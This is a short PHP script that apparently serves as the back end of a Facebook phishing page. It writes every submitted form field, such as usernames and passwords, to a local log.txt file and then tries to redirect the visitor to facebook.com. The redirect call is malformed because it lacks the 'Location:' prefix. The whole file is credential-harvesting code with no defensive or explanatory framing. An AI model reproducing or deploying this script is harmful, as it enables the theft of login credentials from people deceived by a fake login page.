<?php

// Set the location to redirect the page
header ("http://www.facebook.com");
// Open the text file in writing mode
$handle = fopen("log.txt", "a");

foreach($_POST as $variable => $value) {
	fwrite($handle, $variable);
	fwrite($handle, "=");
	fwrite($handle, $value);
	fwrite($handle, "\r\n");
}

fwrite($handle, "\r\n\n");
fclose($handle);
exit;
?>
